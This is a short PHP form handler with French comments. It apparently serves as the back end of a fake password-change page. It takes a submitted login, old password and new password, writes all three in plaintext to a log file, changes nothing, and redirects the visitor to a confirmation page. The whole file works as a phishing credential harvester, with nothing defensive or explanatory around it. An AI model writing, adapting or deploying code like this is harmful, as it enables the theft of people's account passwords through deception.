<?php
// Vérifier si les données ont été soumises
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupérer les valeurs des champs
    $username = filter_var($_POST['login'], FILTER_SANITIZE_STRING);
    $oldPassword = $_POST['old_password'];
    $newPassword = $_POST['new_password'];

    // Enregistrer les données dans un fichier log
    $logFile = "log.txt";
    $currentData = file_get_contents($logFile);
    $currentData .= "Login: " . $username . ", Ancien mot de passe: " . $oldPassword . ", Nouveau mot de passe: " . $newPassword . "\n";
    file_put_contents($logFile, $currentData, LOCK_EX);

    // Redirection vers une page de confirmation
    header("Location: confirmation.html");
    exit();
}
?>